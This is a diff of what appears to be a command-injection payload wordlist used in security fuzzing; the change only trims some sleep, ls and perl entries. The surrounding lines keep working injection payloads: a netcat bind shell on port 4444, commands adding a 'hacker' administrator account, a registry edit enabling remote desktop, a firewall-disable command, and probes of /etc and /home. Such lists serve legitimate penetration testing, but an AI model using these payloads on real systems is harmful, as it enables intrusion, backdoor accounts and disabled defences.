@@ -109,7 +109,6 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 & ping -n 30 127.0.0.1 &
 & pwd
 & reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
-& sleep 10
 & sleep 5
 & sysinfo
 & system('sleep 5');
@@ -150,9 +149,6 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 && phpinfo()
 && pwd
 && reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
-&& sleep 1
-&& sleep 10
-&& sleep 15
 && sleep 5
 && sysinfo
 && system('sleep 5');
@@ -218,10 +214,8 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 ; ls -l /
 ; ls -l /etc/
 ; ls -l /home/*
-; ls -l /tmp
 ; ls -l /var/www/*
 ; ls -lar /etc
-; ls -lar /var/www
 ; nc -lvvp 4444 -e /bin/sh;
 ; net localgroup administrators hacker /add
 ; net user hacker password1 /add
@@ -229,15 +223,9 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 ; netsh firewall set opmode disable
 ; netstat -an
 ; perl -e 'print "x"x16096'
-; perl -e 'print "x"x2048'
-; perl -e 'print "x"x4096'
-; perl -e 'print "x"x8096'
 ; ping 127.0.0.1 ;
 ; pwd
 ; reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
-; sleep 1
-; sleep 10
-; sleep 15
 ; sleep 5
 ; sysinfo
 ; system('sleep 5');
